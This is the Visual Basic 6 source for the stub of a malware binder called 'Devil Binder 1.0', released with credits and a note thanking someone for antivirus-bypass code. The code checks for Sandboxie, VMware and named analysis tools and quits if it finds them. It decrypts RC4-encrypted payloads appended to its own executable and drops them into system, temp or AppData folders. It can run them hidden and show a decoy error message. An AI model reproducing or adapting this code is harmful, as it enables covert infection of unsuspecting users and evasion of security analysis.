VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   90
   ClientLeft      =   120
   ClientTop       =   420
   ClientWidth     =   1620
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   90
   ScaleWidth      =   1620
   StartUpPosition =   3  'Windows-Standard
   Visible         =   0   'False
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'---------------------------------------------------------------------------------------
' Programm  : Devil Binder 1.0
' Author    : pr!ngles
' Contact   : pringles1337@live.de (msn) or 576826717 (icq)
' realease  : 28.09.09
' Tested On : Windows Vista
' Credits to:
'            ZeR0 for Iconchanger
'            dr.kane for bypass Avira Code
'
'Please leave credits to me if you take something of from my binder or if you ripp it
'---------------------------------------------------------------------------------------


Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long


Private Function Sandboxed() As Boolean
Dim hMod As Long

hMod = GetModuleHandle("SbieDll.dll")

If hMod = 0 Then
    Sandboxed = False
        Else
    Sandboxed = True
End If
End Function


Private Function IsVmWare() As Boolean
Dim Hndl As Long
Hndl = FindWindow(vbNullString, VMwareUserControlClass)
If Hndl <> 0 Then
IsVmWare = True
Else
IsVmWare = False
End If
End Function


Private Sub form_load()
Dim file As String
Dim options As String
Dim cmd() As String
Dim message As Boolean
Dim rc_key As String


Dim f As Long
f = FreeFile
file = (App.Path & "\" & App.EXEName & ".exe")

Open file For Binary As #f
DoEvents
options = Space(LOF(f))
Get #f, , options
DoEvents
Close #f

cmd() = Split(options, "#~~~+*()*+~~~#")

Dim settings() As String


If InStr(cmd(1), "sand=1") <> 0 Then
    If Sandboxed = True Then
        End
    End If
End If

If InStr(cmd(1), "vm=1") <> 0 Then
    If IsVmWare = True Then
        End
    End If
End If

Dim antis() As String
antis = Split(cmd(1), "#'#'#")

For I = 0 To UBound(antis)
    If InStr(antis(I), "anti=") <> 0 Then
        If antis(I) <> "anti=0" Then
            Dim windows() As String
            windows = Split(antis(I), "ä/ä")
            
            For u = 0 To UBound(windows) - 1
                window = Replace(windows(u), "anti=", "")
                
                Dim fenster As String, WireClose As String
                fenster = FindWindow(vbNullString, _
                window)
                
                If fenster <> 0 Then
                    End
                End If
            Next
        End If
    End If
Next

For I = 0 To UBound(antis)
    If InStr(antis(I), "key=") <> 0 Then
        rc_key = Replace(antis(I), "key=", "")
        
        'MsgBox rc_key
        Exit For
    End If
Next

If InStr(cmd(1), "mess=0") = 0 Then
    For I = 0 To UBound(antis)
        If InStr(antis(I), "mess=1") <> 0 Then
            Dim abc() As String
            abc = Split(antis(I), "ä&ä")
                message = True
                message_title = abc(1)
                message_text = abc(2)
        End If
    Next
End If
    '########################################

For I = 2 To UBound(cmd)
    
    settings = Split(cmd(I), "%%%%%")
    Dim sett() As String
    sett = Split(settings(1), "~~~~~~")
    For u = 0 To UBound(sett)
        If InStr(sett(u), "run=") <> 0 Then
            run = Replace(sett(u), "run=", "")
        ElseIf InStr(sett(u), "extract=") <> 0 Then
            extract = Replace(sett(u), "extract=", "")
        ElseIf InStr(sett(u), "filename=") <> 0 Then
            FileName = Replace(sett(u), "filename=", "")
        End If
    Next
    
    If extract = "AppPath" Then
        pfad = App.Path & "\"
        
    ElseIf extract = "Windir" Then
        pfad = Environ("WINDIR") & "\"
        
    ElseIf extract = "Sysdir" Then
        pfad = Environ("windir") & "\system32\"
        
    ElseIf extract = "Temp Dir" Then
        pfad = Environ("TEMP") & "\"
        
    ElseIf extract = "AppData" Then
        pfad = Environ("APPDATA") & "\"
        
    End If
    
    Open pfad & FileName For Binary As #f
        Put #f, , RC4(settings(0), rc_key)
    Close #1
    
    Dim runit As Long
 
    If run = "yes/no" Then
        ShellExecute 0&, vbNullString, pfad & FileName, vbNullString, vbNullString, vbNormalFocus
    ElseIf run = "yes/yes" Then
        ShellExecute 0&, vbNullString, pfad & FileName, vbNullString, vbNullString, SW_HIDE
    End If
    
    
Next

If message = True Then
    MsgBox message_text, vbCritical, message_title
End If



End

End Sub

